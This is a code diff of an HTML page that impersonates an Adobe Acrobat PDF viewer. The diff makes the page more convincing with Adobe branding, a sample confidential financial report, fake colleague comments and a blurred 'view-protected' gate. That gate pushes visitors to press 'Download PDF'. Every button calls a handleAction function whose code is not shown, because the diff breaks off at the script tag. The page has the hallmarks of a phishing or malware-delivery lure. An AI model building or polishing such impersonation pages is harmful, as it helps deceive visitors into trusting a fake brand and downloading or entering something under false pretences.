@@ -3,272 +3,634 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adobe Acrobat - PDF Viewer</title>
+    <title>Adobe Acrobat</title>
     <link rel="icon" href="https://www.adobe.com/favicon.ico">
     <style>
         @page { size: A4; margin: 0; }
 
-        * {
+        *, *::before, *::after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
         body {
-            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #1e1e1e;
+            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #393939;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            color: #e1e1e1;
         }
 
-        /* Toolbar */
-        .toolbar {
-            background: #2c2c2c;
-            padding: 10px 20px;
+        /* ─── Global Header ─── */
+        .app-header {
+            background: #1b1b1f;
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            border-bottom: 1px solid #3d3d3d;
+            padding: 0 20px;
+            z-index: 10;
         }
 
-        .toolbar-left {
+        .app-header-left {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
 
-        .toolbar-logo {
+        .adobe-logo-mark {
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .toolbar-logo svg {
-            width: 22px;
-            height: 20px;
+        .adobe-logo-mark svg {
+            width: 24px;
+            height: 21px;
         }
 
-        .toolbar-logo span {
-            color: #e0e0e0;
-            font-size: 14px;
+        .adobe-logo-mark span {
+            font-size: 15px;
             font-weight: 600;
+            color: #fff;
         }
 
-        .toolbar-sep {
+        .header-sep {
             width: 1px;
             height: 20px;
-            background: #4a4a4a;
+            background: #444;
         }
 
-        .toolbar-file {
-            color: #b3b3b3;
+        .header-tabs {
+            display: flex;
+            gap: 4px;
+        }
+
+        .header-tab {
+            color: #b0b0b0;
             font-size: 13px;
-        }
-
-        .toolbar-right {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .tb-btn {
-            background: none;
-            border: none;
-            color: #b3b3b3;
-            padding: 7px 12px;
-            font-size: 12px;
-            cursor: pointer;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            transition: all 0.15s ease;
             font-weight: 500;
-        }
-
-        .tb-btn:hover {
-            background: #3d3d3d;
-            color: #e0e0e0;
-        }
-
-        .tb-btn svg {
-            width: 15px;
-            height: 15px;
-        }
-
-        .tb-btn.accent {
-            background: #EB1000;
-            color: #ffffff;
-        }
-
-        .tb-btn.accent:hover {
-            background: #c40d00;
-        }
-
-        /* Viewer area */
-        .viewer {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 32px 20px;
-            position: relative;
-        }
-
-        .document-page {
-            background: #ffffff;
-            width: 620px;
-            min-height: 800px;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5);
-            border-radius: 4px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        /* Blurred content */
-        .page-text {
-            padding: 56px 52px;
-            filter: blur(3px);
-            user-select: none;
-            pointer-events: none;
-            opacity: 0.7;
-        }
-
-        .page-text .tl {
-            height: 9px;
-            background: #d4d4d4;
-            border-radius: 4px;
-            margin-bottom: 12px;
-        }
-
-        .page-text .tl.w95 { width: 95%; }
-        .page-text .tl.w88 { width: 88%; }
-        .page-text .tl.w75 { width: 75%; }
-        .page-text .tl.w60 { width: 60%; }
-        .page-text .tl.w92 { width: 92%; }
-
-        .page-text .th {
-            height: 14px;
-            background: #b0b0b0;
-            border-radius: 7px;
-            margin-bottom: 20px;
-            width: 48%;
-        }
-
-        .page-text .gap { height: 28px; }
-
-        /* Download overlay */
-        .doc-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255, 255, 255, 0.92);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .overlay-content {
-            text-align: center;
-            max-width: 340px;
-            padding: 28px;
-        }
-
-        .overlay-badge {
-            width: 60px;
-            height: 60px;
-            background: #fff0ef;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .overlay-badge svg {
-            width: 30px;
-            height: 30px;
-        }
-
-        .overlay-content h3 {
-            font-size: 18px;
-            font-weight: 700;
-            color: #2c2c2c;
-            margin-bottom: 8px;
-        }
-
-        .overlay-content p {
-            font-size: 14px;
-            color: #6e6e6e;
-            line-height: 1.6;
-            margin-bottom: 24px;
-        }
-
-        .overlay-action {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #EB1000;
-            color: #ffffff;
-            border: none;
-            border-radius: 24px;
-            padding: 13px 32px;
-            font-size: 14px;
-            font-weight: 600;
+            padding: 6px 14px;
+            border-radius: 6px;
             cursor: pointer;
-            transition: background 0.2s ease, box-shadow 0.2s ease;
+            transition: 0.15s;
             text-decoration: none;
         }
 
-        .overlay-action:hover {
-            background: #c40d00;
-            box-shadow: 0 4px 16px rgba(235, 16, 0, 0.25);
+        .header-tab:hover, .header-tab.active {
+            color: #fff;
+            background: rgba(255,255,255,0.08);
         }
 
-        .overlay-action svg {
+        .header-tab.active {
+            background: rgba(255,255,255,0.12);
+        }
+
+        .app-header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .header-icon-btn {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 6px;
+            background: none;
+            border: none;
+            color: #b0b0b0;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        .header-icon-btn:hover {
+            background: rgba(255,255,255,0.08);
+            color: #fff;
+        }
+
+        .header-icon-btn svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .header-avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #4b6cb7;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        /* ─── Toolbar ─── */
+        .doc-toolbar {
+            background: #2d2d31;
+            border-bottom: 1px solid #3e3e42;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+        }
+
+        .doc-toolbar-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .doc-filename {
+            color: #d4d4d4;
+            font-size: 13px;
+            font-weight: 500;
+            max-width: 260px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .doc-toolbar-center {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .page-nav-btn {
+            width: 28px;
+            height: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            border: none;
+            color: #a0a0a0;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        .page-nav-btn:hover {
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+        }
+
+        .page-nav-btn svg {
             width: 16px;
             height: 16px;
         }
 
-        .overlay-meta {
-            margin-top: 14px;
-            font-size: 11px;
-            color: #b3b3b3;
+        .page-indicator {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #a0a0a0;
         }
 
-        /* Page info bar */
-        .page-bar {
-            background: #2c2c2c;
-            padding: 8px 20px;
+        .page-indicator input {
+            width: 32px;
+            background: #1b1b1f;
+            border: 1px solid #4a4a4e;
+            border-radius: 4px;
+            color: #e0e0e0;
+            text-align: center;
+            font-size: 12px;
+            padding: 3px;
+            outline: none;
+        }
+
+        .page-indicator input:focus {
+            border-color: #4b9dff;
+        }
+
+        .zoom-group {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            margin-left: 12px;
+        }
+
+        .zoom-label {
+            font-size: 12px;
+            color: #a0a0a0;
+            min-width: 36px;
+            text-align: center;
+        }
+
+        .doc-toolbar-right {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tb-action {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: none;
+            border: none;
+            color: #c0c0c0;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        .tb-action:hover {
+            background: rgba(255,255,255,0.06);
+            color: #fff;
+        }
+
+        .tb-action svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .tb-action.primary {
+            background: #1473e6;
+            color: #fff;
+        }
+
+        .tb-action.primary:hover {
+            background: #0d66d0;
+        }
+
+        /* ─── Main Viewer Area ─── */
+        .viewer-container {
+            flex: 1;
+            display: flex;
+            overflow: hidden;
+        }
+
+        /* Thumbnails sidebar */
+        .thumb-sidebar {
+            width: 160px;
+            background: #2d2d31;
+            border-right: 1px solid #3e3e42;
+            overflow-y: auto;
+            padding: 16px 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+
+        .thumb-item {
+            background: #fff;
+            border-radius: 4px;
+            width: 100%;
+            aspect-ratio: 8.5/11;
+            position: relative;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: border 0.15s;
+            overflow: hidden;
+            padding: 8px;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .thumb-item.active {
+            border-color: #1473e6;
+        }
+
+        .thumb-item:hover:not(.active) {
+            border-color: #666;
+        }
+
+        .thumb-item .mini-line {
+            height: 3px;
+            background: #d0d0d0;
+            border-radius: 2px;
+        }
+
+        .thumb-item .mini-line.w90 { width: 90%; }
+        .thumb-item .mini-line.w80 { width: 80%; }
+        .thumb-item .mini-line.w70 { width: 70%; }
+        .thumb-item .mini-line.w60 { width: 60%; }
+        .thumb-item .mini-line.w95 { width: 95%; }
+        .thumb-item .mini-line.head { width: 50%; height: 5px; background: #aaa; margin-bottom: 3px; }
+
+        .thumb-num {
+            position: absolute;
+            bottom: 2px;
+            right: 4px;
+            font-size: 9px;
+            color: #999;
+        }
+
+        /* Document canvas */
+        .doc-canvas {
+            flex: 1;
+            overflow: auto;
+            display: flex;
+            justify-content: center;
+            padding: 28px 20px;
+        }
+
+        .doc-page {
+            background: #ffffff;
+            width: 680px;
+            min-height: 880px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.45);
+            border-radius: 2px;
+            position: relative;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        /* Realistic page content */
+        .page-content {
+            padding: 52px 56px 40px;
+            color: #1a1a1a;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        .page-content .doc-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+
+        .page-content .doc-subtitle {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 28px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .page-content .section-head {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222;
+            margin-top: 24px;
+            margin-bottom: 8px;
+        }
+
+        .page-content p {
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .page-content .text-block {
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        /* Blur overlay for gated content */
+        .blur-mask {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            height: 55%;
+            background: linear-gradient(to bottom, rgba(255,255,255,0) 0%, rgba(255,255,255,0.85) 30%, rgba(255,255,255,0.96) 100%);
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            padding-bottom: 60px;
+        }
+
+        .blur-mask-inner {
+            text-align: center;
+            max-width: 380px;
+        }
+
+        .blur-mask-inner .lock-icon {
+            width: 44px;
+            height: 44px;
+            background: #1473e6;
+            border-radius: 50%;
+            margin: 0 auto 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
         }
 
-        .page-bar span {
-            color: #8a8a8a;
+        .blur-mask-inner .lock-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: #fff;
+        }
+
+        .blur-mask-inner h4 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+
+        .blur-mask-inner p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 18px;
+            line-height: 1.5;
+        }
+
+        .download-cta {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #1473e6;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            padding: 11px 28px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .download-cta:hover {
+            background: #0d66d0;
+        }
+
+        .download-cta svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Right activity panel */
+        .activity-panel {
+            width: 260px;
+            background: #2d2d31;
+            border-left: 1px solid #3e3e42;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
+
+        .panel-header {
+            padding: 14px 16px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #e0e0e0;
+            border-bottom: 1px solid #3e3e42;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .panel-header-tabs {
+            display: flex;
+            gap: 2px;
+        }
+
+        .panel-tab {
             font-size: 12px;
+            color: #888;
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
         }
 
-        /* Print / PDF styles */
+        .panel-tab.active {
+            color: #fff;
+            background: rgba(255,255,255,0.08);
+        }
+
+        .panel-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        .comment-item {
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #3e3e42;
+        }
+
+        .comment-item:last-child {
+            border-bottom: none;
+        }
+
+        .comment-author {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+
+        .comment-avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            font-size: 10px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+
+        .comment-avatar.blue { background: #4b6cb7; }
+        .comment-avatar.green { background: #2e7d32; }
+        .comment-avatar.orange { background: #e67700; }
+
+        .comment-name {
+            font-size: 12px;
+            font-weight: 600;
+            color: #d0d0d0;
+        }
+
+        .comment-time {
+            font-size: 10px;
+            color: #777;
+            margin-left: auto;
+        }
+
+        .comment-text {
+            font-size: 12px;
+            color: #a0a0a0;
+            line-height: 1.5;
+        }
+
+        .panel-input-row {
+            padding: 12px 16px;
+            border-top: 1px solid #3e3e42;
+            display: flex;
+            gap: 8px;
+        }
+
+        .panel-input {
+            flex: 1;
+            background: #1b1b1f;
+            border: 1px solid #4a4a4e;
+            border-radius: 6px;
+            padding: 8px 12px;
+            font-size: 12px;
+            color: #ccc;
+            outline: none;
+        }
+
+        .panel-input:focus {
+            border-color: #1473e6;
+        }
+
+        .panel-send {
+            background: #1473e6;
+            border: none;
+            border-radius: 6px;
+            width: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .panel-send svg {
+            width: 16px;
+            height: 16px;
+            fill: #fff;
+        }
+
+        /* ─── Footer / Status Bar ─── */
+        .status-bar {
+            background: #1b1b1f;
+            padding: 6px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #777;
+        }
+
+        /* Print */
         @media print {
-            body { background: #ffffff; }
-            .toolbar, .page-bar { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
-            .document-page { box-shadow: none; border: 1px solid #e0e0e0; }
-            .overlay-action { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
-            .overlay-badge { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+            body { background: #fff; }
+            .app-header, .doc-toolbar, .thumb-sidebar, .activity-panel, .status-bar, .blur-mask { display: none; }
+            .viewer-container { display: block; }
+            .doc-canvas { padding: 0; }
+            .doc-page { box-shadow: none; width: 100%; }
+            .page-content { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
         }
     </style>
 </head>
 <body>
-    <!-- Toolbar -->
-    <div class="toolbar">
-        <div class="toolbar-left">
-            <div class="toolbar-logo">
+    <!-- ─── App Header ─── -->
+    <div class="app-header">
+        <div class="app-header-left">
+            <div class="adobe-logo-mark">
                 <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                     <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
@@ -276,87 +638,192 @@
                 </svg>
                 <span>Acrobat</span>
             </div>
-            <div class="toolbar-sep"></div>
-            <span class="toolbar-file">Annual_Review_2026.pdf</span>
+            <div class="header-sep"></div>
+            <div class="header-tabs">
+                <span class="header-tab">Home</span>
+                <span class="header-tab active">Documents</span>
+                <span class="header-tab">All tools</span>
+            </div>
         </div>
-        <div class="toolbar-right">
-            <button class="tb-btn" onclick="handleAction()">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <circle cx="18" cy="5" r="3"/>
-                    <circle cx="6" cy="12" r="3"/>
-                    <circle cx="18" cy="19" r="3"/>
-                    <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
-                    <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
-                </svg>
+        <div class="app-header-right">
+            <button class="header-icon-btn" title="Notifications">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></svg>
+            </button>
+            <button class="header-icon-btn" title="Help">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+            </button>
+            <div class="header-avatar">JD</div>
+        </div>
+    </div>
+
+    <!-- ─── Document Toolbar ─── -->
+    <div class="doc-toolbar">
+        <div class="doc-toolbar-left">
+            <span class="doc-filename">Quarterly_Financial_Report_Q1_2026.pdf</span>
+        </div>
+        <div class="doc-toolbar-center">
+            <button class="page-nav-btn" title="Previous page">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+            </button>
+            <div class="page-indicator">
+                <input type="text" value="1" readonly> <span>/ 18</span>
+            </div>
+            <button class="page-nav-btn" title="Next page">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
+            </button>
+            <div class="zoom-group">
+                <button class="page-nav-btn" title="Zoom out">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg>
+                </button>
+                <span class="zoom-label">100%</span>
+                <button class="page-nav-btn" title="Zoom in">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+                </button>
+            </div>
+        </div>
+        <div class="doc-toolbar-right">
+            <button class="tb-action" onclick="handleAction()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.85 2.85 0 114 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
+                Comment
+            </button>
+            <button class="tb-action" onclick="handleAction()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
                 Share
             </button>
-            <button class="tb-btn accent" onclick="handleAction()">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
-                    <polyline points="7 10 12 15 17 10"/>
-                    <line x1="12" y1="15" x2="12" y2="3"/>
-                </svg>
+            <button class="tb-action primary" onclick="handleAction()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                 Download
             </button>
         </div>
     </div>
 
-    <!-- Viewer -->
-    <div class="viewer">
-        <div class="document-page">
-            <div class="page-text">
-                <div class="th"></div>
-                <div class="tl w95"></div>
-                <div class="tl w92"></div>
-                <div class="tl w88"></div>
-                <div class="tl w95"></div>
-                <div class="tl w75"></div>
-                <div class="gap"></div>
-                <div class="th" style="width:36%"></div>
-                <div class="tl w95"></div>
-                <div class="tl w88"></div>
-                <div class="tl w92"></div>
-                <div class="tl w95"></div>
-                <div class="tl w60"></div>
-                <div class="gap"></div>
-                <div class="tl w95"></div>
-                <div class="tl w92"></div>
-                <div class="tl w88"></div>
-                <div class="tl w75"></div>
-                <div class="tl w95"></div>
-                <div class="tl w92"></div>
-                <div class="tl w60"></div>
+    <!-- ─── Main Viewer ─── -->
+    <div class="viewer-container">
+        <!-- Thumbnails -->
+        <div class="thumb-sidebar">
+            <div class="thumb-item active">
+                <div class="mini-line head"></div>
+                <div class="mini-line w95"></div>
+                <div class="mini-line w90"></div>
+                <div class="mini-line w80"></div>
+                <div class="mini-line w95"></div>
+                <div class="mini-line w70"></div>
+                <span class="thumb-num">1</span>
             </div>
+            <div class="thumb-item">
+                <div class="mini-line head" style="width:40%"></div>
+                <div class="mini-line w90"></div>
+                <div class="mini-line w95"></div>
+                <div class="mini-line w80"></div>
+                <div class="mini-line w90"></div>
+                <div class="mini-line w60"></div>
+                <span class="thumb-num">2</span>
+            </div>
+            <div class="thumb-item">
+                <div class="mini-line w95"></div>
+                <div class="mini-line w80"></div>
+                <div class="mini-line w90"></div>
+                <div class="mini-line w95"></div>
+                <div class="mini-line w70"></div>
+                <div class="mini-line w90"></div>
+                <span class="thumb-num">3</span>
+            </div>
+            <div class="thumb-item">
+                <div class="mini-line head"></div>
+                <div class="mini-line w90"></div>
+                <div class="mini-line w80"></div>
+                <div class="mini-line w95"></div>
+                <div class="mini-line w60"></div>
+                <div class="mini-line w80"></div>
+                <span class="thumb-num">4</span>
+            </div>
+        </div>
 
-            <div class="doc-overlay">
-                <div class="overlay-content">
-                    <div class="overlay-badge">
-                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" fill="#EB1000" opacity="0.2" stroke="#EB1000" stroke-width="1.5"/>
-                            <polyline points="14 2 14 8 20 8" fill="none" stroke="#EB1000" stroke-width="1.5"/>
-                        </svg>
-                    </div>
-                    <h3>Download to view document</h3>
-                    <p>This document is protected. Download the PDF to access the full content.</p>
-                    <button class="overlay-action" onclick="handleAction()">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
-                            <polyline points="7 10 12 15 17 10"/>
-                            <line x1="12" y1="15" x2="12" y2="3"/>
-                        </svg>
-                        Download PDF
-                    </button>
-                    <div class="overlay-meta">2.8 MB &middot; 10 pages &middot; Secured by Adobe</div>
+        <!-- Document -->
+        <div class="doc-canvas">
+            <div class="doc-page">
+                <div class="page-content">
+                    <div class="doc-title">Quarterly Financial Report</div>
+                    <div class="doc-subtitle">Q1 2026 &mdash; Prepared for Stakeholders &middot; Confidential</div>
+
+                    <div class="section-head">1. Executive Summary</div>
+                    <p>This report provides a comprehensive overview of the company's financial performance during the first quarter of 2026. Revenue grew by 12.4% year-over-year, driven by strong performance in our cloud services division and expansion into new markets across the Asia-Pacific region.</p>
+                    <p>Operating expenses remained within projected limits at $42.3M, reflecting disciplined cost management and operational efficiency improvements implemented in the prior fiscal year.</p>
+
+                    <div class="section-head">2. Revenue Analysis</div>
+                    <p>Total revenue for Q1 2026 reached $187.6 million, exceeding analyst expectations by 3.2%. The breakdown by business unit is as follows:</p>
+                    <p>&bull; Cloud Services: $98.4M (+18.7% YoY)<br>
+                       &bull; Enterprise Solutions: $52.1M (+6.3% YoY)<br>
+                       &bull; Professional Services: $37.1M (+4.1% YoY)</p>
+
+                    <div class="section-head">3. Operating Expenses</div>
+                    <p>Total operating expenses for the quarter were $142.8 million, representing a 7.2% increase from the same period last year. Key contributors included investments in research and development...</p>
                 </div>
+
+                <!-- Gated content overlay -->
+                <div class="blur-mask">
+                    <div class="blur-mask-inner">
+                        <div class="lock-icon">
+                            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
+                        </div>
+                        <h4>Download to continue reading</h4>
+                        <p>This document is view-protected. Download the full PDF to access all 18 pages.</p>
+                        <button class="download-cta" onclick="handleAction()">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                            Download PDF
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Activity Panel -->
+        <div class="activity-panel">
+            <div class="panel-header">
+                <div class="panel-header-tabs">
+                    <span class="panel-tab active">Comments</span>
+                    <span class="panel-tab">Activity</span>
+                </div>
+            </div>
+            <div class="panel-body">
+                <div class="comment-item">
+                    <div class="comment-author">
+                        <div class="comment-avatar blue">JS</div>
+                        <span class="comment-name">James Sullivan</span>
+                        <span class="comment-time">2h ago</span>
+                    </div>
+                    <div class="comment-text">Revenue numbers look strong this quarter. Can we get a breakdown of the APAC region separately?</div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-author">
+                        <div class="comment-avatar green">ML</div>
+                        <span class="comment-name">Maria Lopez</span>
+                        <span class="comment-time">1h ago</span>
+                    </div>
+                    <div class="comment-text">Updated the operating expense figures in Section 3. Please review before the board meeting.</div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-author">
+                        <div class="comment-avatar orange">RK</div>
+                        <span class="comment-name">Raj Kumar</span>
+                        <span class="comment-time">45m ago</span>
+                    </div>
+                    <div class="comment-text">@James I'll have the APAC breakdown ready by end of day. The growth there has been exceptional.</div>
+                </div>
+            </div>
+            <div class="panel-input-row">
+                <input class="panel-input" type="text" placeholder="Add a comment...">
+                <button class="panel-send">
+                    <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                </button>
             </div>
         </div>
     </div>
 
-    <!-- Page bar -->
-    <div class="page-bar">
-        <span>Page 1 of 10</span>
-        <span>&middot;</span>
-        <span>100%</span>
+    <!-- Status Bar -->
+    <div class="status-bar">
+        <span>Quarterly_Financial_Report_Q1_2026.pdf &mdash; 4.2 MB</span>
+        <span>Last modified: Apr 14, 2026 &middot; Shared with 3 people</span>
     </div>
 
     <script>
